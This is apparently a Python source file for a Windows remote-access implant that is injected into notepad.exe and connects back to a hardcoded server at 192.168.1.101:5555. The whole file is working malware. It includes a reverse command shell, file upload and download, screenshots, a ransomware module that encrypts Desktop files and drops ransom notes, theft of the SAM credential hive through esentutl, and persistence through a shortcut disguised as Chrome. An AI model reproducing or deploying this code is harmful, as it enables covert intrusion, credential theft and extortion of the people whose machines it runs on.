import pymem

pmem = pymem.Pymem("notepad.exe")
pmem.inject_python_interpreter()

code = """
import socket, subprocess, os, pyautogui, pymem, time, threading, win32com.client
from cryptography.fernet import Fernet

#Clean the socket so if something was 'stuck', it won't affect the next command
def clean_socket_pipe():
    s.setblocking(0)
    s.setblocking(1)


#A function to receive all the data that is sent, even if the Size is unknown. This is the ONLY real way to send and receive files.
def recv_command_output(command, timeout=2):
    s.setblocking(1)
    s.setblocking(0)
    total_data = b''
    data = ''
    begin_time = time.time()

    if command == 'upload_file':
        timeout = 1
        
    while True:
        if total_data and time.time()-begin_time > 4:
            break

        elif time.time()-begin_time > timeout*20:
            break

        else:
            try:
                data = s.recv(8192)
                if data:
                    total_data += data
                    begin_time = time.time()
                else:
                    time.sleep(0.1)
            except:
                pass
    return total_data



#This function is used to send the binary of a local file to the server. It gets one parameter which is file path
def download_file(file_path_to_send="{}".format(os.getenv('APPDATA') + "\Microsoft\Drive.png")):
    global command
    if command == 'download_file':
        file_path_to_send = s.recv(1024).decode().strip()
        
    with open(file_path_to_send, 'rb') as f:
        file_binary = f.read()
    s.send(file_binary)



#For receiving a file binary from the server. This first gets where to save the file, and then the file binary.
def upload_file():
    try:
        where_to_save_file = recv_command_output('upload').decode().strip()
        clean_socket_pipe()

        file_binary = recv_command_output('upload')
        with open(where_to_save_file, 'wb') as f:
            f.write(file_binary)

        s.send("File Uploaded".encode())

    except Exception as e:
        s.send("{}".format(e).encode())



#The function is used for deleting a file.
def delete_file(path, sender):
    try:
        os.remove(path)
    except PermissionError:
        time.sleep(30)
        try:
            os.remove(path)
        except:
            if sender == 'dll_enum':
                s.send("You have asked for the file to fast.  "
                       "Enumerating the DLL's used by the injected process takes between 2 minutes up to 24 hours. It depends on the size of the victim file system"
                       "  Please try these command again later, if still doesn't work try it later than later ;)".encode())



def screenshot():
    screenshot_path = os.getenv('APPDATA') + "\Microsoft\Drive.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    download_file(screenshot_path)
    os.remove(screenshot_path)



######################################################################### DLL Enumeration Start ###################################################################


def get_used_dlls():
    pmem = pymem.Pymem("notepad.exe")
    used_dlls_list = []
    modules = list(pmem.list_modules())
    for module in modules:
        used_dlls_list.append(module.name)
    used_dlls_set = set(used_dlls_list)
    with open(os.getenv('APPDATA') + "\Microsoft\Drive.txt", 'w+') as f:
        for i in used_dlls_list:
            f.write("{},".format(i))
        for dirpath, dir_names, file_names in os.walk(r'C:/'):
            if len(file_names) > 0:
                dlls_of_a_path = set(file_names).intersection(used_dlls_set)
                if len(dlls_of_a_path) > 0:
                    f.write(r"#{}  &&  {} ".format(dirpath, dlls_of_a_path))



def dll_enum():
    download_file(os.getenv('APPDATA') + "\Microsoft\Drive.txt")
    t1 = threading.Thread(target=delete_file, args=[os.getenv('APPDATA') + "\Microsoft\Drive.txt", "dll_enum"])
    t1.start()


######################################################################### DLL Enumeration END #####################################################################



################################################################### RANSOMWARE  Start ##############################################################################

def Create_symmetric_key():
    try:
        symmetric_key_value = s.recv(1024).decode().strip()
        symmetric_key = Fernet(symmetric_key_value)  
        return symmetric_key
    except Exception as err:
        symmetric_key = Fernet('TEf4-kjjrBt1V57EecJ9mmVm8247wYDWUCtk9REC-Bd=')  
        return symmetric_key


def Readme_note():  ### writing 33 Readme notes
    README = ''' SilverStrike got you Hard!!!   #SilverPlate3Nation# '''
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')

    try:
        os.chdir(desktop)
        for i in range(33):
            note_num = "READ_ME" + str(i) + ".txt"
            with open(note_num, 'w') as note:
                note.write(README)
        # s.send('Created README')
    except Exception as err:
        print('Readme_note: ' + str(err))
        # s.send('Couldn't throw README')



def Encrypt_files(file_to_encrypt, symmetric_key):
    global encrypted_files_counter
    try:
        with open(file_to_encrypt, 'rb') as f:  ###reading the file data
            data_to_encrypt = f.read()
        encrypted_data = symmetric_key.encrypt(data_to_encrypt)  ### Encrypting the file data
        with open(file_to_encrypt, 'wb') as ff:
            ff.write(encrypted_data)  ### Replacing the file data with encrypted data
        encrypted_files_counter += 1
    except:
        pass



def Decrypt_files(file_to_decrypt, symmetric_key):
    global decrypted_files_counter
    try:
        with open(file_to_decrypt, 'rb') as f:
            data_to_decrypt = f.read()  ### Reading the Encrypted data
        decrypted_data = symmetric_key.decrypt(data_to_decrypt)  ### Decrypting it
        with open(file_to_decrypt, 'wb') as k:
            k.write(decrypted_data)  ### writing back to the file the Decrypted data
            decrypted_files_counter += 1
    except:
        pass



def Should_i_encrypt(command, symmetric_key, path=os.path.join(os.environ['USERPROFILE'], 'Desktop')):
    # Static values
    dont_touch_extensions = ['exe', 'lnk', 'ini']

    try:
        for file in os.listdir(path):  ###listing the objects under this folder
            file_path = os.path.join(path, file)
            if file[-3:] in dont_touch_extensions:  ### checking the extension
                continue
            elif os.path.isdir(file_path) == True:
                if "Desktop" in file_path:  ###cheking if the folder is under the desktop
                    Should_i_encrypt(command, symmetric_key, file_path)
                else:
                    continue
            else:
                if command.lower() == 'encrypt':
                    Encrypt_files(file_path, symmetric_key)
                else:
                    Decrypt_files(file_path, symmetric_key)

    except Exception as err:
        print('Should_i_encrypt: ' + str(err))



def ransom(symmetric_key):
    command = s.recv(1024).decode()
    if command == 'encrypt' or command == 'decrypt':
        Should_i_encrypt(command, symmetric_key)
        if command.lower() == 'encrypt':
            s.send("Encrypted files. & This command has encrypted {} files".format(encrypted_files_counter).encode())
        else:
            s.send("Decrypted files. & This command decrypted {} files. ".format(decrypted_files_counter).encode())
    else:
        Readme_note()
        s.send("Readme notes dropped".encode())

###################################################### Ransomware End #################################################


###################################################### SAM start ######################################################

def sam():
    output_path = os.getenv('APPDATA') + "\Microsoft\SAM"
    command = 'esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d {}'.format(output_path)
    p1 = subprocess.run(command, shell=True, capture_output=True)
    result = p1.stdout + p1.stderr

    try: 
        if "error" in str(result):
            raise Exception

        time.sleep(10)
        download_file(output_path)

    except:
        with open(output_path + ".txt", 'w') as f:
            f.write("The injected process must run as local admin.     {}".format(result))
        download_file(output_path)
    
    os.remove(output_path)

######################################################  SAM end  ######################################################


################################################## Persistence Start ##################################################
def persistence():
    os.chdir(r"{}\Downloads".format(os.getenv('USERPROFILE')))
    subprocess.call(r'curl "https://iconarchive.com/download/i38830/google/chrome/Google-Chrome.ico" -o ""chrome.ico', creationflags=0x08000000)
    
    start = time.time()
    while(True):
        end = time.time()
        if end - start > 2:
            break
    
    lnk_path = os.environ['USERPROFILE'] + "\Desktop\chome.lnk"
    wshell = win32com.client.Dispatch("WScript.Shell")
    lnk = wshell.CreateShortCut(lnk_path)
    lnk.TargetPath = r"powershell.exe"
    lnk.arguments = r'Start "{}\AppData\Local\Programs\Python\Python39\pythonw.exe" "{}\PycharmProjects\Python_injecter\Injected_Client.pyw" -Verb Runas'.format(os.getenv('USERPROFILE'), os.getenv('USERPROFILE'))
    lnk.windowstyle = 7
    lnk.Hotkey = "CTRL+X"
    lnk.IconLocation = r"{}\Downloads\chrome.ico".format(os.getenv('USERPROFILE'))
    lnk.save()
    
    s.send('Persistence taken, possibility for process elevation as well.'.encode())


################################################## Persistence End ####################################################


while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('192.168.1.101', 5555))
        break
    except:
        time.sleep(3)
t1 = threading.Thread(target=get_used_dlls)
t1.start()


decrypted_files_counter, encrypted_files_counter = 0,0

while True:
    clean_socket_pipe()
    command = s.recv(2048).decode().strip()
    
    if command.lower() == "download_file":
        download_file()
        
    elif command.lower() == "screenshot":
        screenshot()
        
    elif command.lower() == "dll_enum":
        dll_enum()
        
    elif command.lower() == "upload_file":
        upload_file()
        
    elif command.lower() == "ransom":
        ransom(Create_symmetric_key())
        
    elif command.lower() == "sam":
        sam()
        
    elif command.lower() == "persistence":
        persistence()
    
    else:
        p1 = subprocess.run(command, shell=True, capture_output=True)
        result = p1.stdout + p1.stderr
        if result.decode() == "":
            s.send("none".encode())
        else:
            s.send(result)
"""

pmem.inject_python_shellcode(code)


